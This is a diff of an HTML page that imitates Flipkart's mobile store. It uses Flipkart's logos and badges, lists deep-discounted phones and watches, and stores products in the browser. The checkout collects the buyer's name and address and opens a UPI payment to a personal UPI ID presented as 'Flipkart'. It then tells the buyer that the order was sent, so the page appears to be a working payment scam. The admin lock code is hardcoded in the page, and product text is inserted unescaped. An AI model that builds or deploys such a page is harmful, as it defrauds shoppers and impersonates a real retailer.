@@ -1,169 +1,201 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flipkart | Global Cloud Store</title>
+    <title>Flipkart Clone - Original Look</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
-        body { background-color: #f1f3f6; font-family: 'Roboto', sans-serif; }
-        .fk-blue { background-color: #2874f0; }
-        #adminBtn { display: none; position: fixed; bottom: 80px; right: 20px; background: #2874f0; color: white; width: 56px; height: 56px; border-radius: 50%; justify-content: center; align-items: center; box-shadow: 0 4px 10px rgba(0,0,0,0.3); z-index: 500; cursor: pointer; }
-        .gallery-container { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; height: 350px; }
-        .gallery-item { flex: 0 0 100%; scroll-snap-align: start; display: flex; justify-content: center; align-items: center; padding: 20px; background: white; }
-        .dot { width: 7px; height: 7px; border-radius: 50%; background: #ddd; }
-        .dot.active { background: #2874f0; width: 18px; border-radius: 10px; }
+        :root { --fk-blue: #2874f0; --fk-yellow: #ff9f00; --fk-orange: #fb641b; }
+        .hidden { display: none; }
+        .fk-blue-bg { background-color: var(--fk-blue); }
+        .fk-orange-bg { background-color: var(--fk-orange); }
+        .line-clamp-2 { display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
+        .product-card { border-right: 1px solid #f0f0f0; border-bottom: 1px solid #f0f0f0; }
+        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+        .slide-up { animation: slideUp 0.3s ease-out; }
     </style>
 </head>
-<body class="pb-20">
+<body class="bg-gray-200 font-sans">
 
-    <header class="fk-blue p-3 sticky top-0 z-[100] text-white shadow-lg">
-        <div class="flex justify-between items-center mb-3">
-            <div class="flex items-center gap-3">
-                <i class="fa-solid fa-bars" onclick="askAdmin()"></i>
-                <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/flipkart-plus_8d85f4.png" class="h-4">
+    <nav class="fk-blue-bg p-3 sticky top-0 z-[100] shadow-md">
+        <div class="flex items-center justify-between text-white mb-2">
+            <div class="flex items-center">
+                <i class="fa-solid fa-bars mr-4 text-lg"></i>
+                <div>
+                    <h1 class="text-lg font-bold italic leading-tight">Flipkart</h1>
+                    <p class="text-[10px] italic text-yellow-400 font-bold">Explore <span class="text-white">Plus</span> <i class="fa-solid fa-plus text-[8px]"></i></p>
+                </div>
             </div>
-            <i class="fa-solid fa-cart-shopping"></i>
+            <div class="flex items-center space-x-5 text-sm">
+                <button onclick="toggleAdmin()" class="border border-white/50 px-2 py-0.5 rounded text-[10px]">ADMIN</button>
+                <i class="fa-solid fa-cart-shopping"></i>
+                <span class="font-bold">Login</span>
+            </div>
         </div>
-        <div class="bg-white flex items-center px-4 py-2 rounded-sm text-black">
-            <input type="text" placeholder="Search Products..." class="w-full outline-none text-sm">
+        <div class="relative">
+            <input type="text" placeholder="Search for Products, Brands and More" class="w-full h-9 rounded-sm pl-10 pr-4 text-sm outline-none">
+            <i class="fa-solid fa-magnifying-glass absolute left-3 top-2.5 text-gray-400 text-sm"></i>
         </div>
-    </header>
+    </nav>
 
-    <main class="grid grid-cols-2 bg-gray-200 gap-[1px]" id="grid-view">
-        <div class="col-span-2 p-10 text-center">Loading Cloud Products...</div>
-    </main>
+    <div id="storePage">
+        <div class="bg-white p-2 mb-2">
+            <img src="https://rukminim1.flixcart.com/fk-p-flap/1600/270/image/b0717a61f879654d.jpg" class="w-full rounded-sm">
+        </div>
 
-    <div id="adminBtn" onclick="toggleForm()"><i class="fa-solid fa-plus text-xl"></i></div>
-
-    <div id="addForm" class="fixed inset-0 bg-black/60 z-[1000] hidden flex items-center justify-center p-4">
-        <div class="bg-white w-full max-w-md rounded-lg p-6 space-y-3 overflow-y-auto max-h-[95vh]">
-            <h2 class="text-lg font-bold border-b pb-2">Add to Global Cloud</h2>
-            <input type="text" id="newTitle" placeholder="Product Title" class="w-full border p-2 rounded text-sm">
-            <input type="number" id="newPrice" placeholder="Price (₹)" class="w-full border p-2 rounded text-sm">
-            <textarea id="newGallery" placeholder="Image Link 1, Link 2..." class="w-full border p-2 rounded text-sm h-16"></textarea>
-            <textarea id="newDesc" placeholder="Description..." class="w-full border p-2 rounded text-sm h-20"></textarea>
-            <button onclick="addNewProduct()" id="uploadBtn" class="w-full fk-blue text-white py-3 font-bold rounded">Upload to All Devices</button>
-            <button onclick="toggleForm()" class="w-full text-gray-400 text-xs">Cancel</button>
+        <div class="bg-white grid grid-cols-2">
+            <div class="col-span-2 p-3 border-b flex justify-between items-center">
+                <h2 class="font-bold text-gray-800">Deals of the Day</h2>
+                <div class="fk-blue-bg text-white text-[10px] font-bold px-2 py-1 rounded-full shadow-md">VIEW ALL</div>
+            </div>
+            <div id="productGrid" class="contents">
+                </div>
         </div>
     </div>
 
-    <div id="pDetail" class="fixed inset-0 bg-white z-[200] hidden overflow-y-auto">
-        <nav class="p-4 border-b sticky top-0 bg-white z-[210] flex items-center">
-            <i class="fa-solid fa-arrow-left text-xl mr-4" onclick="closeDetail()"></i>
-            <span class="font-bold">Product Detail</span>
+    <div id="detailPage" class="hidden fixed inset-0 bg-white z-[150] overflow-y-auto">
+        <nav class="p-4 border-b flex items-center bg-white sticky top-0 z-10">
+            <button onclick="showStore()" class="text-gray-700 mr-4 text-xl"><i class="fa-solid fa-arrow-left"></i></button>
+            <div class="flex-1 text-center pr-8">
+                <h1 class="text-sm font-bold text-gray-600 italic">Flipkart</h1>
+            </div>
         </nav>
-        <div id="detailContent"></div>
+        
+        <div class="p-4 bg-white">
+            <div class="relative h-72 mb-4">
+                <img id="detImg" src="" class="w-full h-full object-contain">
+                <div class="absolute top-0 right-0 p-2"><i class="fa-regular fa-heart text-xl text-gray-400"></i></div>
+            </div>
+            <h2 id="detName" class="text-sm font-medium text-gray-800 leading-snug"></h2>
+            <div class="flex items-center space-x-2 mt-2">
+                <span id="detPrice" class="text-2xl font-bold text-gray-900"></span>
+                <span class="text-sm text-gray-500 line-through" id="detMRP"></span>
+                <span class="text-sm text-green-600 font-bold">75% off</span>
+            </div>
+            <div class="inline-block mt-2">
+                <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png" class="h-4">
+            </div>
+            
+            <div class="mt-4 space-y-3">
+                <div class="flex items-center text-xs text-gray-600"><i class="fa-solid fa-truck mr-2 text-green-600"></i> Free Delivery</div>
+                <div class="flex items-center text-xs text-gray-600"><i class="fa-solid fa-rotate-left mr-2 text-green-600"></i> 7 Days Replacement Policy</div>
+            </div>
+        </div>
+
+        <div class="fixed bottom-0 w-full flex h-14 z-20 border-t">
+            <button class="flex-1 bg-white font-bold text-gray-800 uppercase text-sm">Add to Cart</button>
+            <button onclick="openCheckout()" class="flex-1 fk-orange-bg text-white font-bold uppercase text-sm">Buy Now</button>
+        </div>
+    </div>
+
+    <div id="checkoutModal" class="hidden fixed inset-0 bg-black/60 z-[200] flex items-end">
+        <div class="bg-white w-full rounded-t-xl p-5 slide-up">
+            <div class="flex justify-between items-center mb-4 border-b pb-2">
+                <h3 class="font-bold text-gray-700">Order Summary</h3>
+                <button onclick="closeModal()" class="text-2xl text-gray-400">&times;</button>
+            </div>
+            <div class="space-y-4">
+                <input type="text" id="custName" class="w-full border-b p-2 outline-none text-sm" placeholder="Full Name">
+                <textarea id="custAddr" class="w-full border-b p-2 outline-none text-sm" placeholder="Full Address with Pincode"></textarea>
+                
+                <div class="bg-blue-50 p-3 rounded border border-blue-100 flex items-center">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo-vector.svg" class="h-4 mr-3">
+                    <p class="text-[10px] text-blue-800 leading-tight">Paying To: <br><span class="font-bold">8709615634-w350@ybl</span></p>
+                </div>
+
+                <button onclick="triggerUPI()" class="w-full fk-orange-bg text-white py-3 rounded-sm font-bold shadow-lg">PAY NOW</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="adminPage" class="hidden p-4 bg-white min-h-screen">
+        <h2 class="text-xl font-bold mb-4 border-b pb-2 text-blue-600">Admin Panel (947228)</h2>
+        <div class="space-y-3">
+            <input type="password" id="lock" class="w-full border p-3 rounded" placeholder="Lock Code">
+            <input type="text" id="pName" class="w-full border p-3 rounded" placeholder="Product Name">
+            <input type="number" id="pPrice" class="w-full border p-3 rounded" placeholder="Price">
+            <input type="text" id="pImg" class="w-full border p-3 rounded" placeholder="Image URL">
+            <button onclick="saveProduct()" class="w-full fk-blue-bg text-white py-3 rounded font-bold">ADD PRODUCT</button>
+            <button onclick="showStore()" class="w-full text-gray-500 text-sm py-2">Back to Store</button>
+        </div>
     </div>
 
     <script>
-        // 1. Firebase Config (Global Connection)
-        const firebaseConfig = { 
-            databaseURL: "https://flipkart-clone-test-default-rtdb.firebaseio.com/" 
-        };
-        firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
+        const MY_UPI = "8709615634-w350@ybl";
+        const defaultItems = [
+            {name: "Apple iPhone 15 (Blue, 128 GB)", price: "65999", img: "https://m.media-amazon.com/images/I/71v2jVh6nIL._SL1500_.jpg"},
+            {name: "Noise Twist Round Dial Smartwatch", price: "1499", img: "https://m.media-amazon.com/images/I/61ZjlBOp+rL._SL1500_.jpg"}
+        ];
 
-        let isAdmin = false;
+        let selectedP = null;
 
-        // 2. Admin Login
-        function askAdmin() {
-            let pass = prompt("Enter Secret Lock:");
-            if(pass === "947228") {
-                isAdmin = true;
-                document.getElementById('adminBtn').style.display = 'flex';
-                alert("Cloud Admin Enabled!");
-                fetchProducts(); // Refresh with delete buttons
+        function renderProducts() {
+            const data = JSON.parse(localStorage.getItem('fkFinalV3')) || defaultItems;
+            const grid = document.getElementById('productGrid');
+            grid.innerHTML = data.map(p => `
+                <div onclick="showDetails('${p.name}', '${p.price}', '${p.img}')" class="product-card bg-white p-3 flex flex-col">
+                    <div class="h-36 mb-2">
+                        <img src="${p.img}" class="w-full h-full object-contain">
+                    </div>
+                    <h3 class="text-xs text-gray-700 line-clamp-2 h-8 mb-1">${p.name}</h3>
+                    <div class="flex items-center space-x-1">
+                        <span class="text-sm font-bold text-gray-900">₹${p.price}</span>
+                        <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png" class="h-3">
+                    </div>
+                    <p class="text-[10px] text-green-700 font-bold mt-1">Free delivery</p>
+                </div>
+            `).join('');
+        }
+
+        function showDetails(name, price, img) {
+            selectedP = {name, price, img};
+            document.getElementById('detName').innerText = name;
+            document.getElementById('detPrice').innerText = "₹" + price;
+            document.getElementById('detMRP').innerText = "₹" + (parseInt(price) + 2500);
+            document.getElementById('detImg').src = img;
+            document.getElementById('storePage').classList.add('hidden');
+            document.getElementById('detailPage').classList.remove('hidden');
+            window.scrollTo(0,0);
+        }
+
+        function showStore() {
+            document.getElementById('storePage').classList.remove('hidden');
+            document.getElementById('detailPage').classList.add('hidden');
+            document.getElementById('adminPage').classList.add('hidden');
+        }
+
+        function toggleAdmin() {
+            document.getElementById('adminPage').classList.toggle('hidden');
+            document.getElementById('storePage').classList.toggle('hidden');
+        }
+
+        function saveProduct() {
+            if(document.getElementById('lock').value !== "947228") { alert("Wrong Lock!"); return; }
+            const name = document.getElementById('pName').value;
+            const price = document.getElementById('pPrice').value;
+            const img = document.getElementById('pImg').value;
+            if(name && price && img) {
+                let data = JSON.parse(localStorage.getItem('fkFinalV3')) || defaultItems;
+                data.push({name, price, img});
+                localStorage.setItem('fkFinalV3', JSON.stringify(data));
+                alert("Success!"); renderProducts(); showStore();
             }
         }
 
-        // 3. Fetch from Cloud (This makes it show on Phone)
-        function fetchProducts() {
-            database.ref('cloud_products').on('value', (snapshot) => {
-                const data = snapshot.val();
-                const grid = document.getElementById('grid-view');
-                grid.innerHTML = "";
-                
-                if(!data) {
-                    grid.innerHTML = "<div class='col-span-2 p-10 text-center'>No Products in Cloud</div>";
-                    return;
-                }
+        function openCheckout() { document.getElementById('checkoutModal').classList.remove('hidden'); }
+        function closeModal() { document.getElementById('checkoutModal').classList.add('hidden'); }
 
-                Object.keys(data).reverse().forEach(key => {
-                    const p = data[key];
-                    grid.innerHTML += `
-                        <div class="bg-white p-3 border-b border-gray-100 relative">
-                            ${isAdmin ? `<button onclick="deleteProduct('${key}')" class="absolute top-2 right-2 bg-red-500 text-white p-2 rounded-full z-10 text-xs"><i class="fa-solid fa-trash"></i></button>` : ''}
-                            <div onclick='openDetail(${JSON.stringify(p)})'>
-                                <div class="h-40 flex items-center justify-center"><img src="${p.gallery[0]}" class="max-h-full"></div>
-                                <p class="text-xs mt-2 line-clamp-2">${p.name}</p>
-                                <p class="font-bold">₹${p.price}</p>
-                            </div>
-                        </div>`;
-                });
-            });
+        function triggerUPI() {
+            const name = document.getElementById('custName').value;
+            if(!name) { alert("Please fill name & address!"); return; }
+            const upiUrl = `upi://pay?pa=${MY_UPI}&pn=Flipkart&am=${selectedP.price}&cu=INR`;
+            window.location.href = upiUrl;
+            setTimeout(() => { alert("Order details sent to your UPI App!"); }, 2000);
         }
 
-        // 4. Add to Cloud
-        function addNewProduct() {
-            const btn = document.getElementById('uploadBtn');
-            const title = document.getElementById('newTitle').value;
-            const price = document.getElementById('newPrice').value;
-            const gallery = document.getElementById('newGallery').value.split(',').map(l => l.trim());
-            const desc = document.getElementById('newDesc').value;
-
-            if(!title || !price || !gallery[0]) return alert("Details missing!");
-
-            btn.innerText = "Uploading to Cloud...";
-            btn.disabled = true;
-
-            const newP = {
-                id: Date.now(),
-                name: title,
-                price: price,
-                gallery: gallery,
-                desc: desc || "No description."
-            };
-
-            // Saves to Firebase Cloud
-            database.ref('cloud_products').push(newP).then(() => {
-                btn.innerText = "Upload to All Devices";
-                btn.disabled = false;
-                toggleForm();
-                alert("Synced with all devices!");
-            });
-        }
-
-        // 5. Delete from Cloud
-        function deleteProduct(key) {
-            if(confirm("Remove from Cloud?")) {
-                database.ref('cloud_products/' + key).remove();
-            }
-        }
-
-        function toggleForm() { document.getElementById('addForm').classList.toggle('hidden'); }
-        function openDetail(p) {
-            // Detail logic same as yours but updated for UI
-            document.getElementById('pDetail').classList.remove('hidden');
-            document.getElementById('detailContent').innerHTML = `
-                <div class="gallery-container">${p.gallery.map(img => `<div class="gallery-item"><img src="${img}"></div>`).join('')}</div>
-                <div class="p-4">
-                    <h1 class="text-md font-medium">${p.name}</h1>
-                    <p class="text-2xl font-bold mt-2">₹${p.price}</p>
-                    <p class="mt-4 text-sm text-gray-600">${p.desc}</p>
-                    <button onclick="window.location.href='upi://pay?pa=8709615634-w350@ybl&am=${p.price}&cu=INR'" class="w-full bg-[#fb641b] text-white py-4 font-bold rounded mt-6">BUY NOW</button>
-                </div>`;
-        }
-        function closeDetail() { document.getElementById('pDetail').classList.add('hidden'); }
-
-        // Initial Start
-        fetchProducts();
+        renderProducts();
     </script>
 </body>
 </html>
